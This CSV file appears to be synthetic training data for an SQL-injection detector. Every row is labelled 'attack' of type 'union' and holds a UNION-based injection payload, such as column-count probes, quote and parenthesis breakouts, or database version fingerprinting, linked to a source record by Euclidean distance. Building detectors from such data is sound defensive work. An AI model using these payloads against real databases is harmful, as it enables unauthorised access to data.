id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000018,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,0.11531825534723762
SMOTE_000019,attack,union,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",nearest_attack_euclidean,R001157,0.2869545108344128
SMOTE_000020,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000897,0.1971448705188957
SMOTE_000021,attack,union," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,1.6634195097932165
SMOTE_000022,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001201,0.26171798002946955
SMOTE_000023,attack,union,"1""   )    )     )   union all select null#",nearest_attack_euclidean,R001150,0.6218737844287234
SMOTE_000024,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R001536,0.28762341700517424
SMOTE_000025,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001320,0.08658350670045369
SMOTE_000026,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000088,1.61199206470051
SMOTE_000027,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001196,0.5680897413353099
SMOTE_000028,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R001072,0.602237078176488
SMOTE_000029,attack,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",nearest_attack_euclidean,R000907,0.35159421289427206
SMOTE_000030,attack,union,"1"" where 8672  =  8672 union all select null,null#",nearest_attack_euclidean,R001404,0.20571944962713895
SMOTE_000031,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000403,0.26322741649315523
SMOTE_000032,attack,union,"-1475""  )   union all select 8611,8611,8611#",nearest_attack_euclidean,R000617,0.36481520020188585
SMOTE_000033,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,0.02659121788843502
SMOTE_000034,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000833,0.3576277015667267
SMOTE_000035,attack,union,"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.2876595789840585
SMOTE_000036,attack,union,"-8002'   )    )     )   union all select 6647,6647,6647--",nearest_attack_euclidean,R000388,0.006525231292720319
SMOTE_000037,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R001045,0.3087385629232261
SMOTE_000038,attack,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",nearest_attack_euclidean,R001454,0.13525156755363352
SMOTE_000039,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001093,0.4495004446318311
SMOTE_000040,attack,union,"-4798%'   )    )     )   union all select 3330,3330,3330#",nearest_attack_euclidean,R000693,0.3271292259966112
SMOTE_000041,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R001458,0.38739465647544796
SMOTE_000042,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000775,0.22629849018422513
SMOTE_000043,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000435,0.49646346004745406
SMOTE_000044,attack,union,"-8588' union all select 2135,2135--",nearest_attack_euclidean,R000563,0.05304584582275417
SMOTE_000045,attack,union,"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001162,0.1228901558149452
SMOTE_000046,attack,union,-9841 where 4612  =  4612 union all select 4612--,nearest_attack_euclidean,R000822,0.41844620671226557
SMOTE_000047,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001089,0.2632885151244475
SMOTE_000048,attack,union,"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",nearest_attack_euclidean,R000612,0.33405418349136784
SMOTE_000049,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001432,0.2177678882339844
SMOTE_000050,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.4351735598050677
SMOTE_000051,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.02428058245145895
SMOTE_000052,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,1.9349911843920642
SMOTE_000053,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000972,0.004504215755475544
SMOTE_000054,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000686,0.018099634663681734
SMOTE_000055,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R001546,0.04263222544787427
SMOTE_000056,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001093,0.44752364214120177
SMOTE_000057,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R001519,0.048866229340637946
SMOTE_000058,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000067,2.6738134334561727
SMOTE_000059,attack,union,"-3349   )    )     )   union all select 6553,6553#",nearest_attack_euclidean,R000246,0.7725163489515808
SMOTE_000060,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000558,0.05784869729059406
SMOTE_000061,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000537,0.12900918833167105
SMOTE_000062,attack,union,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",nearest_attack_euclidean,R000212,0.02757405161907387
SMOTE_000063,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000400,0.007199892932334874
SMOTE_000064,attack,union," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000190,0.012271963123318172
SMOTE_000065,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000978,0.10631168065513977
SMOTE_000066,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000862,0.12146446974751768
SMOTE_000067,attack,union,"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",nearest_attack_euclidean,R001008,0.7715713960721086
SMOTE_000068,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000818,0.3421501877848047
SMOTE_000069,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000136,0.07320695883131022
SMOTE_000070,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000342,0.1772361660888581
SMOTE_000071,attack,union,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",nearest_attack_euclidean,R000441,0.3278163947913247
SMOTE_000072,attack,union,"-5731"" union all select 3083,3083,3083#",nearest_attack_euclidean,R000860,0.18716576848200525
SMOTE_000073,attack,union,"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",nearest_attack_euclidean,R001533,0.2518714607990881
SMOTE_000074,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000129,0.901127127775163
SMOTE_000075,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000315,0.2509143465482772
SMOTE_000076,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000158,0.29335952622278977
SMOTE_000077,attack,union," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",nearest_attack_euclidean,R000165,0.2059187140685565
SMOTE_000078,attack,union,"-1684""   )    )     )   union all select 7473,7473#",nearest_attack_euclidean,R000352,0.07146293661969215
SMOTE_000079,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000835,0.24734745764115193
SMOTE_000080,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001115,0.4712783757376367
SMOTE_000081,attack,union,"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",nearest_attack_euclidean,R001151,0.10484092634460117
SMOTE_000082,attack,union,"-6118 union all select 5906,5906,5906,5906,5906#",nearest_attack_euclidean,R001110,0.022182740678738964
SMOTE_000083,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000978,0.10704876832438759
SMOTE_000084,attack,union,"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",nearest_attack_euclidean,R001232,0.17636086904133128
SMOTE_000085,attack,union,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",nearest_attack_euclidean,R000634,0.5149998642232271
SMOTE_000086,attack,union,"1%"" union all select null#",nearest_attack_euclidean,R000753,0.763268948023961
SMOTE_000087,attack,union," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",nearest_attack_euclidean,R000133,0.1889631930462674
SMOTE_000088,attack,union,1' where 8159  =  8159 union all select null#,nearest_attack_euclidean,R001018,0.7980273604687881
SMOTE_000089,attack,union,"-9371'  )   union all select 5900,5900,5900#",nearest_attack_euclidean,R001392,0.17223724052610703
SMOTE_000090,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000198,0.16297026255885977
SMOTE_000091,attack,union,"1 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000274,0.9521019720704879
SMOTE_000092,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000016,0.6433745531021501
SMOTE_000093,attack,union,"-4798%'   )    )     )   union all select 3330,3330,3330#",nearest_attack_euclidean,R000693,0.4902937147451884
SMOTE_000094,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001189,0.3064833568026178
SMOTE_000095,attack,union,"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",nearest_attack_euclidean,R001293,0.2405509423596382
SMOTE_000096,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000615,0.02460964063380041
SMOTE_000097,attack,union,-2452'   )    )     )   union all select 1951--,nearest_attack_euclidean,R000492,0.24536585091096214
SMOTE_000098,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,0.10187187792938278
SMOTE_000099,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R001535,0.4280039746496084
SMOTE_000100,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000337,0.27298164380865303
SMOTE_000101,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001051,0.018178841628298234
SMOTE_000102,attack,union,"1%""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000837,0.17906290111828405
SMOTE_000103,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,0.3401985688751985
SMOTE_000104,attack,union,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",nearest_attack_euclidean,R000983,0.11418236010828664
SMOTE_000105,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.8365850816244219
SMOTE_000106,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000343,0.6926607119629424
SMOTE_000107,attack,union,"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",nearest_attack_euclidean,R000377,0.2989166250189672
SMOTE_000108,attack,union,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",nearest_attack_euclidean,R000624,0.1542256084133052
SMOTE_000109,attack,union,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",nearest_attack_euclidean,R000737,0.43093746691255547
SMOTE_000110,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000455,0.2892572758146581
SMOTE_000111,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R001422,0.03608160478806348
SMOTE_000112,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R001074,0.28684375047507227
SMOTE_000113,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000872,0.32185935510509023
SMOTE_000114,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000304,0.15205580458678977
SMOTE_000115,attack,union,"-2518' union all select 6818,6818,6818,6818,6818,6818#",nearest_attack_euclidean,R001529,0.1584877761497808
SMOTE_000116,attack,union,"1%'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001179,0.1660180050665774
SMOTE_000117,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R001226,0.010607449794925332
SMOTE_000118,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000104,0.262865360955039
SMOTE_000119,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R001094,0.5556945385715667
SMOTE_000120,attack,union,1' in boolean mode  )   union all select null--,nearest_attack_euclidean,R000305,0.20423628072528396
SMOTE_000121,attack,union," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000058,0.35871361329153345
SMOTE_000122,attack,union,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",nearest_attack_euclidean,R000701,0.00449770599634055
SMOTE_000123,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000023,0.8033048846849278
SMOTE_000124,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000851,0.40373508218451726
SMOTE_000125,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001201,0.02542216657371433
SMOTE_000126,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000122,0.11745418800828285
SMOTE_000127,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,0.09514865986191631
SMOTE_000128,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,1.6858739404357614e-07
SMOTE_000129,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000975,0.2120987220248309
SMOTE_000130,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000610,0.46831651927750656
SMOTE_000131,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001528,0.24275205654898577
SMOTE_000132,attack,union,"-8369""   )    )    union all select 2191--",nearest_attack_euclidean,R000359,0.26633332638005935
SMOTE_000133,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000463,0.16517124948740747
SMOTE_000134,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R001298,0.3442961255440085
SMOTE_000135,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000322,0.0687353460437951
SMOTE_000136,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000537,0.16463794056734996
SMOTE_000137,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000403,0.3055032011253526
SMOTE_000138,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001189,0.2292187044836748
SMOTE_000139,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000345,0.07565344792633909
SMOTE_000140,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R001511,0.07388130789700612
SMOTE_000141,attack,union,"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",nearest_attack_euclidean,R001148,0.39497047856320633
SMOTE_000142,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000727,0.2700284271303041
SMOTE_000143,attack,union,"1'  )   where 7658  =  7658 union all select null,null#",nearest_attack_euclidean,R000561,0.2941231690227733
SMOTE_000144,attack,union,-9690 union all select 7217#,nearest_attack_euclidean,R000409,0.0001044018868999472
SMOTE_000145,attack,union,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",nearest_attack_euclidean,R001182,0.1569403916960682
SMOTE_000146,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R001474,0.12034798861676659
SMOTE_000147,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000051,0.09382675475362445
SMOTE_000148,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.0
SMOTE_000149,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R000507,0.6270259691902931
SMOTE_000150,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001108,0.16783448233792458
SMOTE_000151,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R001493,0.0454442492999034
SMOTE_000152,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000194,0.0670194494001732
SMOTE_000153,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R001049,0.3601916908189899
SMOTE_000154,attack,union,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",nearest_attack_euclidean,R000697,0.8373472417212313
SMOTE_000155,attack,union,"-4304' where 1005  =  1005 union all select 1005,1005#",nearest_attack_euclidean,R000606,0.43455480360656557
SMOTE_000156,attack,union,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",nearest_attack_euclidean,R001058,0.15401853229854254
SMOTE_000157,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001318,0.36917260219857534
SMOTE_000158,attack,union,"-9774'   )    )     )   union all select 6954,6954,6954#",nearest_attack_euclidean,R000678,0.1547262184728162
SMOTE_000159,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001023,0.6220831853155931
SMOTE_000160,attack,union,"-1015""   )    )    union all select 6624,6624#",nearest_attack_euclidean,R000885,0.028108661355034228
SMOTE_000161,attack,union,"-5278""   )    )     )   union all select 5264,5264,5264#",nearest_attack_euclidean,R000622,0.3949319635699413
SMOTE_000162,attack,union,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",nearest_attack_euclidean,R000510,0.38528516196866014
SMOTE_000163,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000562,0.057204131151465644
SMOTE_000164,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000442,0.11257355713117903
SMOTE_000165,attack,union,"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",nearest_attack_euclidean,R000290,0.33132450424812976
SMOTE_000166,attack,union,-6165%'   )    )    union all select 5384#,nearest_attack_euclidean,R000396,0.8108087886875501
SMOTE_000167,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000514,0.12024820811855667
SMOTE_000168,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,0.06907796883764392
SMOTE_000169,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000117,0.10338121687805117
SMOTE_000170,attack,union,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",nearest_attack_euclidean,R000507,0.3324520689083302
SMOTE_000171,attack,union,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001502,0.17625420614605716
SMOTE_000172,attack,union,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",nearest_attack_euclidean,R000946,0.3439771032046298
SMOTE_000173,attack,union,"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",nearest_attack_euclidean,R001073,0.1379463200628166
SMOTE_000174,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000324,0.002315310690387723
SMOTE_000175,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000861,0.15567995767492254
SMOTE_000176,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000382,0.9913834951104387
SMOTE_000177,attack,union,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",nearest_attack_euclidean,R000802,0.04536761053083902
SMOTE_000178,attack,union," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000066,0.07714747939318897
SMOTE_000179,attack,union,1'+  (  select 'yahq' where 6974  =  6974 union all select null--,nearest_attack_euclidean,R001198,0.5758175008349892
SMOTE_000180,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R001461,0.02250586875721998
SMOTE_000181,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,0.021482654265836936
SMOTE_000182,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000964,0.46973056758125814
SMOTE_000183,attack,union,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",nearest_attack_euclidean,R000640,0.06954267505325519
SMOTE_000184,attack,union,"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",nearest_attack_euclidean,R000592,0.17217011438871796
SMOTE_000185,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000438,0.16249212370367672
SMOTE_000186,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001108,0.12607715154515922
SMOTE_000187,attack,union,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",nearest_attack_euclidean,R000224,0.3430633506669218
SMOTE_000188,attack,union,"-1438 where 6759  =  6759 union all select 6759,6759#",nearest_attack_euclidean,R000281,0.053024803646281114
SMOTE_000189,attack,union,"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",nearest_attack_euclidean,R001105,0.24950207441530792
SMOTE_000190,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000141,0.3200641432804833
SMOTE_000191,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R000491,0.17270897739319785
SMOTE_000192,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R001158,0.013895569187485591
SMOTE_000193,attack,union,"-9371'  )   union all select 5900,5900,5900#",nearest_attack_euclidean,R001392,0.36388395184163086
SMOTE_000194,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,0.30017762088750244
